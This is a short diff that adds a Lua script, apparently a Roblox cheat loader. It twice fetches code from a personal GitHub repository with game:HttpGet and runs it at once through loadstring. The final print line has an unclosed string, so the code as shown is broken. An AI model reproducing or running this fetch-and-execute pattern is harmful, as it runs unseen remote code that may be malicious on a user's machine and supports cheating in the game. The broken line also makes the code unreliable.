@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelo0002/psvb/refs/heads/main/1.lua"))()
+task.wait(0.3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelo0002/psvb/refs/heads/main/mm2.lua"))()
+print("done)
